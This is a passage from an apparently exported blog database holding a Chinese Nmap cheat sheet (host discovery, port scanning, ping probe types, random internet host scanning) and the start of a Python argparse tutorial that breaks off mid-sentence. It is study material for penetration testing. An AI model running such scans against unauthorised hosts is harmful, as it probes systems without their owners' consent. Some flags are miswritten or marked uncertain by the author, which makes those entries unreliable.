指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。\n\n```\n\n\n\n\n## \b常规使用\n\n```bash\nnmap IP/Hostname                    # 最基本的使用情况\nnmap host1 host2 host3 etc...       # 扫描多主机\nnmap 192.168.0.1-192.168.1.254      # 扫描IP地址段\nnmap 192.168.0.1/23                 # CIDR格式的网络地址段（与上一条命令等同）\nnmap -iL list.txt                   # \b扫描目标主机列表\nnmap -Pn host                       # \b假定目标存活\n\n\n\n```\n## 高级使用\n```bash\nnmap -A host                        # ？？？？？？？\n\n\n```\n---\n---\n---\n\n## 渗透测试中不常用(我反正没用过)\n```bash\nnmap 192.168.1.0/24 --exclude 192.168.1.11  # 排除一些主机\nnmap -iR 100                        # \b随机扫描互联网上100个主机\nnmap -Sp                            # 只ping扫描，\nnmap -PS                            # TCP SYN scan (TCP SYN ping)\nnmap -PA                            # TCP ACK scan ping\nnmap -PU                            # UDP scan  ping\nnmap -PY                            # ??? SCTP scan\b ping\nnmap -PE/PP/PM                      # ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？\nnmap -PO [protocol] host            # 指定协议ping\nnmap -PR                            # ??? ARP ping \nnmap --traceroute                   # traceroute 功能 探测网络路径\nnmap -n/-R                          # Never do DNS resolution/Always resolve [default: sometimes]\nnmap --dns-servers serv1,serv2,,,   # 指定DNS\nnmap --system-dns                   # 使用系统DNS\nnmap -sL IPs                        # 列出IPs\b的反向DNS结果\nnmap \n\n\n\n```\n## 参考资料\n[Introduction to Nmap](http://resources.infosecinstitute.com/nmap-cheat-sheet/)\n\n[Nmap从探测到漏洞利用备忘录 – Nmap简介(一)](http://www.freebuf.com/articles/network/32302.html)\n\n## #\b零散\b\b知识\n\n#### Nmap脚本引擎(NSE)\n    - 网络探测\n    - 漏洞检测\n    - 漏洞利用\n\n#### 端口状态说明\n- Open(开放的): 应用程序正在这个端口上监听连接。\n\n- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。\n\n- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。\n\n- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。\n\n- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。\n\n- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。","source":"_posts/Nmap-cheat-sheet.md","raw":"---\ntitle: Nmap cheat sheet\ndate: 2017-05-07 18:47:45\ntags:\n---\nhttp://www.91ri.org/8654.html\n## Nmap 介绍\n![功能架构图](http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG)\n\n### 四项基本功能\n\n- 主机发现（Host Discovery）\n\n- 端口扫描（Port Scanning）\n\n- 版本侦测（Version Detection）\n\n- 操作系统侦测（Operating System Detection）\n\n    而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n\n## 基本使用\n### 主机发现\n\n\n```bash\nnmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    # 多主机地址扫描\nnmap -A -T4 host        \n# -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)\n# -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。\n\n```\n\n\n\n\n## \b常规使用\n\n```bash\nnmap IP/Hostname                    # 最基本的使用情况\nnmap host1 host2 host3 etc...       # 扫描多主机\nnmap 192.168.0.1-192.168.1.254      # 扫描IP地址段\nnmap 192.168.0.1/23                 # CIDR格式的网络地址段（与上一条命令等同）\nnmap -iL list.txt                   # \b扫描目标主机列表\nnmap -Pn host                       # \b假定目标存活\n\n\n\n```\n## 高级使用\n```bash\nnmap -A host                        # ？？？？？？？\n\n\n```\n---\n---\n---\n\n## 渗透测试中不常用(我反正没用过)\n```bash\nnmap 192.168.1.0/24 --exclude 192.168.1.11  # 排除一些主机\nnmap -iR 100                        # \b随机扫描互联网上100个主机\nnmap -Sp                            # 只ping扫描，\nnmap -PS                            # TCP SYN scan (TCP SYN ping)\nnmap -PA                            # TCP ACK scan ping\nnmap -PU                            # UDP scan  ping\nnmap -PY                            # ??? SCTP scan\b ping\nnmap -PE/PP/PM                      # ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？\nnmap -PO [protocol] host            # 指定协议ping\nnmap -PR                            # ??? ARP ping \nnmap --traceroute                   # traceroute 功能 探测网络路径\nnmap -n/-R                          # Never do DNS resolution/Always resolve [default: sometimes]\nnmap --dns-servers serv1,serv2,,,   # 指定DNS\nnmap --system-dns                   # 使用系统DNS\nnmap -sL IPs                        # 列出IPs\b的反向DNS结果\nnmap \n\n\n\n```\n## 参考资料\n[Introduction to Nmap](http://resources.infosecinstitute.com/nmap-cheat-sheet/)\n\n[Nmap从探测到漏洞利用备忘录 – Nmap简介(一)](http://www.freebuf.com/articles/network/32302.html)\n\n## #\b零散\b\b知识\n\n#### Nmap脚本引擎(NSE)\n    - 网络探测\n    - 漏洞检测\n    - 漏洞利用\n\n#### 端口状态说明\n- Open(开放的): 应用程序正在这个端口上监听连接。\n\n- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。\n\n- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。\n\n- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。\n\n- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。\n\n- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。","slug":"Nmap-cheat-sheet","published":1,"updated":"2017-05-09T07:26:42.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3oaflt60002a8uvimtkf2wj","content":"<p><a href=\"http://www.91ri.org/8654.html\" target=\"_blank\" rel=\"external\">http://www.91ri.org/8654.html</a></p>\n<h2 id=\"Nmap-介绍\"><a href=\"#Nmap-介绍\" class=\"headerlink\" title=\"Nmap 介绍\"></a>Nmap 介绍</h2><p><img src=\"http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG\" alt=\"功能架构图\"></p>\n<h3 id=\"四项基本功能\"><a href=\"#四项基本功能\" class=\"headerlink\" title=\"四项基本功能\"></a>四项基本功能</h3><ul>\n<li><p>主机发现（Host Discovery）</p>\n</li>\n<li><p>端口扫描（Port Scanning）</p>\n</li>\n<li><p>版本侦测（Version Detection）</p>\n</li>\n<li><p>操作系统侦测（Operating System Detection）</p>\n<p>  而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。</p>\n</li>\n</ul>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    <span class=\"comment\"># 多主机地址扫描</span></div><div class=\"line\">nmap -A -T4 host        </div><div class=\"line\"><span class=\"comment\"># -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)</span></div><div class=\"line\"><span class=\"comment\"># -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。</span></div></pre></td></tr></table></figure>\n<h2 id=\"常规使用\"><a href=\"#常规使用\" class=\"headerlink\" title=\"\b常规使用\"></a>\b常规使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap IP/Hostname                    <span class=\"comment\"># 最基本的使用情况</span></div><div class=\"line\">nmap host1 host2 host3 etc...       <span class=\"comment\"># 扫描多主机</span></div><div class=\"line\">nmap 192.168.0.1-192.168.1.254      <span class=\"comment\"># 扫描IP地址段</span></div><div class=\"line\">nmap 192.168.0.1/23                 <span class=\"comment\"># CIDR格式的网络地址段（与上一条命令等同）</span></div><div class=\"line\">nmap -iL list.txt                   <span class=\"comment\"># \b扫描目标主机列表</span></div><div class=\"line\">nmap -Pn host                       <span class=\"comment\"># \b假定目标存活</span></div></pre></td></tr></table></figure>\n<h2 id=\"高级使用\"><a href=\"#高级使用\" class=\"headerlink\" title=\"高级使用\"></a>高级使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap -A host                        <span class=\"comment\"># ？？？？？？？</span></div></pre></td></tr></table></figure>\n<h2 id=\"—\"><a href=\"#—\" class=\"headerlink\" title=\"—\"></a>—</h2><hr>\n<h2 id=\"渗透测试中不常用-我反正没用过\"><a href=\"#渗透测试中不常用-我反正没用过\" class=\"headerlink\" title=\"渗透测试中不常用(我反正没用过)\"></a>渗透测试中不常用(我反正没用过)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap 192.168.1.0/24 --exclude 192.168.1.11  <span class=\"comment\"># 排除一些主机</span></div><div class=\"line\">nmap -iR 100                        <span class=\"comment\"># \b随机扫描互联网上100个主机</span></div><div class=\"line\">nmap -Sp                            <span class=\"comment\"># 只ping扫描，</span></div><div class=\"line\">nmap -PS                            <span class=\"comment\"># TCP SYN scan (TCP SYN ping)</span></div><div class=\"line\">nmap -PA                            <span class=\"comment\"># TCP ACK scan ping</span></div><div class=\"line\">nmap -PU                            <span class=\"comment\"># UDP scan  ping</span></div><div class=\"line\">nmap -PY                            <span class=\"comment\"># ??? SCTP scan\b ping</span></div><div class=\"line\">nmap -PE/PP/PM                      <span class=\"comment\"># ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？</span></div><div class=\"line\">nmap -PO [protocol] host            <span class=\"comment\"># 指定协议ping</span></div><div class=\"line\">nmap -PR                            <span class=\"comment\"># ??? ARP ping </span></div><div class=\"line\">nmap --traceroute                   <span class=\"comment\"># traceroute 功能 探测网络路径</span></div><div class=\"line\">nmap -n/-R                          <span class=\"comment\"># Never do DNS resolution/Always resolve [default: sometimes]</span></div><div class=\"line\">nmap --dns-servers serv1,serv2,,,   <span class=\"comment\"># 指定DNS</span></div><div class=\"line\">nmap --system-dns                   <span class=\"comment\"># 使用系统DNS</span></div><div class=\"line\">nmap <span class=\"_\">-s</span>L IPs                        <span class=\"comment\"># 列出IPs\b的反向DNS结果</span></div><div class=\"line\">nmap</div></pre></td></tr></table></figure>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://resources.infosecinstitute.com/nmap-cheat-sheet/\" target=\"_blank\" rel=\"external\">Introduction to Nmap</a></p>\n<p><a href=\"http://www.freebuf.com/articles/network/32302.html\" target=\"_blank\" rel=\"external\">Nmap从探测到漏洞利用备忘录 – Nmap简介(一)</a></p>\n<h2 id=\"零散知识\"><a href=\"#零散知识\" class=\"headerlink\" title=\"#\b零散\b\b知识\"></a>#\b零散\b\b知识</h2><h4 id=\"Nmap脚本引擎-NSE\"><a href=\"#Nmap脚本引擎-NSE\" class=\"headerlink\" title=\"Nmap脚本引擎(NSE)\"></a>Nmap脚本引擎(NSE)</h4><pre><code>- 网络探测\n- 漏洞检测\n- 漏洞利用\n</code></pre><h4 id=\"端口状态说明\"><a href=\"#端口状态说明\" class=\"headerlink\" title=\"端口状态说明\"></a>端口状态说明</h4><ul>\n<li><p>Open(开放的): 应用程序正在这个端口上监听连接。</p>\n</li>\n<li><p>Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>\n</li>\n<li><p>Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>\n</li>\n<li><p>Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>\n</li>\n<li><p>Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>\n</li>\n<li><p>Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://www.91ri.org/8654.html\">http://www.91ri.org/8654.html</a></p>\n<h2 id=\"Nmap-介绍\"><a href=\"#Nmap-介绍\" class=\"headerlink\" title=\"Nmap 介绍\"></a>Nmap 介绍</h2><p><img src=\"http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG\" alt=\"功能架构图\"></p>\n<h3 id=\"四项基本功能\"><a href=\"#四项基本功能\" class=\"headerlink\" title=\"四项基本功能\"></a>四项基本功能</h3><ul>\n<li><p>主机发现（Host Discovery）</p>\n</li>\n<li><p>端口扫描（Port Scanning）</p>\n</li>\n<li><p>版本侦测（Version Detection）</p>\n</li>\n<li><p>操作系统侦测（Operating System Detection）</p>\n<p>  而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。</p>\n</li>\n</ul>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    <span class=\"comment\"># 多主机地址扫描</span></div><div class=\"line\">nmap -A -T4 host        </div><div class=\"line\"><span class=\"comment\"># -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)</span></div><div class=\"line\"><span class=\"comment\"># -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。</span></div></pre></td></tr></table></figure>\n<h2 id=\"常规使用\"><a href=\"#常规使用\" class=\"headerlink\" title=\"\b常规使用\"></a>\b常规使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap IP/Hostname                    <span class=\"comment\"># 最基本的使用情况</span></div><div class=\"line\">nmap host1 host2 host3 etc...       <span class=\"comment\"># 扫描多主机</span></div><div class=\"line\">nmap 192.168.0.1-192.168.1.254      <span class=\"comment\"># 扫描IP地址段</span></div><div class=\"line\">nmap 192.168.0.1/23                 <span class=\"comment\"># CIDR格式的网络地址段（与上一条命令等同）</span></div><div class=\"line\">nmap -iL list.txt                   <span class=\"comment\"># \b扫描目标主机列表</span></div><div class=\"line\">nmap -Pn host                       <span class=\"comment\"># \b假定目标存活</span></div></pre></td></tr></table></figure>\n<h2 id=\"高级使用\"><a href=\"#高级使用\" class=\"headerlink\" title=\"高级使用\"></a>高级使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap -A host                        <span class=\"comment\"># ？？？？？？？</span></div></pre></td></tr></table></figure>\n<h2 id=\"—\"><a href=\"#—\" class=\"headerlink\" title=\"—\"></a>—</h2><hr>\n<h2 id=\"渗透测试中不常用-我反正没用过\"><a href=\"#渗透测试中不常用-我反正没用过\" class=\"headerlink\" title=\"渗透测试中不常用(我反正没用过)\"></a>渗透测试中不常用(我反正没用过)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap 192.168.1.0/24 --exclude 192.168.1.11  <span class=\"comment\"># 排除一些主机</span></div><div class=\"line\">nmap -iR 100                        <span class=\"comment\"># \b随机扫描互联网上100个主机</span></div><div class=\"line\">nmap -Sp                            <span class=\"comment\"># 只ping扫描，</span></div><div class=\"line\">nmap -PS                            <span class=\"comment\"># TCP SYN scan (TCP SYN ping)</span></div><div class=\"line\">nmap -PA                            <span class=\"comment\"># TCP ACK scan ping</span></div><div class=\"line\">nmap -PU                            <span class=\"comment\"># UDP scan  ping</span></div><div class=\"line\">nmap -PY                            <span class=\"comment\"># ??? SCTP scan\b ping</span></div><div class=\"line\">nmap -PE/PP/PM                      <span class=\"comment\"># ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？</span></div><div class=\"line\">nmap -PO [protocol] host            <span class=\"comment\"># 指定协议ping</span></div><div class=\"line\">nmap -PR                            <span class=\"comment\"># ??? ARP ping </span></div><div class=\"line\">nmap --traceroute                   <span class=\"comment\"># traceroute 功能 探测网络路径</span></div><div class=\"line\">nmap -n/-R                          <span class=\"comment\"># Never do DNS resolution/Always resolve [default: sometimes]</span></div><div class=\"line\">nmap --dns-servers serv1,serv2,,,   <span class=\"comment\"># 指定DNS</span></div><div class=\"line\">nmap --system-dns                   <span class=\"comment\"># 使用系统DNS</span></div><div class=\"line\">nmap <span class=\"_\">-s</span>L IPs                        <span class=\"comment\"># 列出IPs\b的反向DNS结果</span></div><div class=\"line\">nmap</div></pre></td></tr></table></figure>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://resources.infosecinstitute.com/nmap-cheat-sheet/\">Introduction to Nmap</a></p>\n<p><a href=\"http://www.freebuf.com/articles/network/32302.html\">Nmap从探测到漏洞利用备忘录 – Nmap简介(一)</a></p>\n<h2 id=\"零散知识\"><a href=\"#零散知识\" class=\"headerlink\" title=\"#\b零散\b\b知识\"></a>#\b零散\b\b知识</h2><h4 id=\"Nmap脚本引擎-NSE\"><a href=\"#Nmap脚本引擎-NSE\" class=\"headerlink\" title=\"Nmap脚本引擎(NSE)\"></a>Nmap脚本引擎(NSE)</h4><pre><code>- 网络探测\n- 漏洞检测\n- 漏洞利用\n</code></pre><h4 id=\"端口状态说明\"><a href=\"#端口状态说明\" class=\"headerlink\" title=\"端口状态说明\"></a>端口状态说明</h4><ul>\n<li><p>Open(开放的): 应用程序正在这个端口上监听连接。</p>\n</li>\n<li><p>Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>\n</li>\n<li><p>Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>\n</li>\n<li><p>Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>\n</li>\n<li><p>Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>\n</li>\n<li><p>Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>\n</li>\n</ul>\n"},{"title":"Python argparse模块详解","date":"2017-06-08T02:27:24.000Z","_content":">    argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。\n>    官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。   \n>    https://docs.python.org/3/library/argparse.html\n\n## 使用步骤\n```\nimport argparse                     # 导入模板\n\nparser = argparse.ArgumentParser()  # 创建parser\n\nparser.add_argument()               # 添加参数\n\nargs = parser.parse_args()          # 参数解析\n```\n\n## [ArgumentParser对象](https://docs.python.org/3/library/argparse.html#argumentparser-objects)\n    class argparse.ArgumentParser(\n        prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n        usage=None,                 # 替换默认的Usage信息\n        description=None,           # 程序简要信息说明(参数说明前)\n        epilog=None,                # 附加信息说明(参数说明后)\n        parents=[],                 # 继承父解析器(parser)\n        formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n        prefix_chars='-',           # 参数前缀符号(默认为-,如：-h/--help)\n        fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n        argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n        conflict_handler='error',   # 参数冲突处理\n        add_help=True,              # 帮助信息中默认添加\"-h, --help\"描述\n        allow_abbrev=True           # 允许参数缩写\n    )\n\n## [add_argument()方法](https://docs.python.org/3/library/argparse.html#the-add-argument-method)\n    ArgumentParser.add_argument(\n        name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n        [, action]      # 采取的基本操作\n                            store(默认)         存储参数值\n                            store_const        使用该字符串选项时，取用const值\n                            store_true         使用该字符串选项时，参数值置为True\n                            store_false        使用该字符串选项时，参数值置为False\n                            append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                            append_const       将多个字符串选项的const值合并到一个list\n                            count              统计选项出现的次数 （如：\"-vvv\",则最终值为3）\n                            help               parser默认会添加一个help action。(一般不用理会)\n                            version            打印版本信息\n                            也可以自定义action类\n        [, nargs]       # 该参数值要求的数量\n                            数值       指明参数个数\n                            ?         提供了参数则取参数值；\n                                        无参数但声明了选项字符串则取const值；\n                                        无参数也未声明选择字符串则取default值\n                            *         所有参数存入list\n                            +         与*类似，但参数个数不能为空\n                            argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n        [, const]       # action/nargs部分要求的常值\n                            1、当action=\"store_const\"或者\"append_const\"时需要设置\n                            2、当选项为(-f/--foo),nargs='?'，同时未提供具体参数时，取用该值。\n        [, default]     # 参数默认值\n        [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n        [, choices]     # 允许的参数值（白名单）,tuple/range\n        [, required]    # 选项是否必须，设置为True表示选项必填。\n        [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n        [, metavar]     # 定义参数在Usage信息中的名称\n        [, dest]        # 解析后的属性名称\n    )\n- ### [自定义action](https://docs.python.org/3/library/argparse.html#action-classes)\n\n    class argparse.**Action**(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)\n\n## [parse_args()方法](https://docs.python.org/3/library/argparse.html#the-parse-args-method)\n    ArgumentParser.parse_args(args=None, namespace=None)\n一般情况下，我们直接使用如下命令就可以了：\n```python\n# args=None, 程序将sys.argv作为参数代入\nargs = parse.parse_args()              \n\n# 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。\nargs = parser.parse_args(['1', '2', '3', '4'])\n\n# namespace=custom_class，将属性分配到一个已经存在的对象中。\nparser.parse_args(args=['--foo', 'BAR'], namespace=custom_class99)\n```\n\n## [其它工具](https://docs.python.org/3/library/argparse.html#other-utilities)\n\n- ### [子命令](https://docs.python.org/3/library/argparse.html#sub-commands)\n    很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。\n\n    ArgumentParser.**add_subparsers**([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> subparsers = parser.add_subparsers(dest='subparser_name')\n    >>> subparser1 = subparsers.add_parser('1')\n    >>> subparser1.add_argument('-x')\n    >>> subparser2 = subparsers.add_parser('2')\n    >>> subparser2.add_argument('y')\n    >>> parser.parse_args(['2', 'frobble'])\n    Namespace(subparser_name='2', y='frobble')\n\n    ```\n\n\n- ### [文件类型对象](https://docs.python.org/3/library/argparse.html#filetype-objects)\n    add_argument()中的FileType的参数\"工厂\"。\n\n    class argparse.**FileType**(mode='r', bufsize=-1, encoding=None, errors=None)\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--raw', type=argparse.FileType('wb', 0))\n    >>> parser.add_argument('out', type=argparse.FileType('w', encoding='UTF-8'))\n    >>> parser.parse_args(['--raw', 'raw.dat', 'file.txt'])\n    Namespace(out=<_io.TextIOWrapper name='file.txt' mode='w' encoding='UTF-8'>, raw=<_io.FileIO name='raw.dat' mode='wb'>)\n\n    ```\n\n- ### [参数分组](https://docs.python.org/3/library/argparse.html#argument-groups)\n    在Usage信息中的参数分组，如pip -h可以看到\"Commands\",\"General Options\"分组。\n\n    ArgumentParser.**add_argument_group**(title=None, description=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='testPROG', add_help=False)\n    >>> group1 = parser.add_argument_group('group1', 'group1 description')\n    >>> group1.add_argument('foo', help='foo help')\n    >>> group2 = parser.add_argument_group('group2', 'group2 description')\n    >>> group2.add_argument('--bar', help='bar help')\n    \n    >>> parser.print_help()\n    \n    usage: testPROG [--bar BAR] foo\n\n    group1:\n    group1 description\n\n    foo    foo help\n\n    group2:\n    group2 description\n\n    --bar BAR  bar help\n    ```\n\n- ### [互斥](https://docs.python.org/3/library/argparse.html#mutual-exclusion)\n    参数互斥！\n\n    ArgumentParser.**add_mutually_exclusive_group**(required=False)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='PROG')\n    >>> group = parser.add_mutually_exclusive_group(required=True)\n    >>> group.add_argument('--foo', action='store_true')\n    >>> group.add_argument('--bar', action='store_false')\n    >>> parser.parse_args([])\n    usage: PROG [-h] (--foo | --bar)\n    PROG: error: one of the arguments --foo --bar is required\n    ```\n\n- ### [解析器默认配置](https://docs.python.org/3/library/argparse.html#parser-defaults)\n    在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。\n\n    ArgumentParser.**set_defaults**(**kwargs)       # 设置默认值\n\n    ArgumentParser.**get_default**(dest)            # 获取默认值\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('foo', type=int)\n    >>> parser.set_defaults(bar=42, baz='badger')   # 不审查是否在命令行中声明，故而bar，baz可以直接添加\n    >>> parser.parse_args(['736'])\n    Namespace(bar=42, baz='badger', foo=736)\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='bar') # 解析器级别默认值总是覆盖参数级别默认值\n    >>> parser.set_defaults(foo='spam')\n    >>> parser.parse_args([])\n    Namespace(foo='spam')\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='badger')\n    >>> parser.get_default('foo')                   # 获取默认值\n    'badger'\n\n    ```\n\n- ### [打印帮忙](https://docs.python.org/3/library/argparse.html#printing-help)\n    用于打印帮助信息。\n\n    ArgumentParser.**print_usage**(file=None)\n\n    ArgumentParser.**print_help**(file=None)\n\n    ArgumentParser.**format_usage**()\n\n    ArgumentParser.**format_help**()\n\n- ### [部分解析](https://docs.python.org/3/library/argparse.html#partial-parsing)\n    有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。\n\n    ArgumentParser.**parse_known_args**(args=None, namespace=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', action='store_true')\n    >>> parser.add_argument('bar')\n    >>> parser.parse_known_args(['--foo', '--badger', 'BAR', 'spam'])\n    (Namespace(bar='BAR', foo=True), ['--badger', 'spam'])     # ['--badger', 'spam']即为多余的参数。\n    ```\n\n- ### [自定义文件解析](https://docs.python.org/3/library/argparse.html#customizing-file-parsing)\n\n- ### [退出方法](https://docs.python.org/3/library/argparse.html#exiting-methods)\n\n- ### [optparse代码升级](https://docs.python.org/3/library/argparse.html#upgrading-optparse-code)\n    原本argparse是与optparse保持兼容的，但是！@#￥%……&*（。升级办法如下：\n1.    Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.\n2.    Replace (options, args) = parser.parse_args() with args = 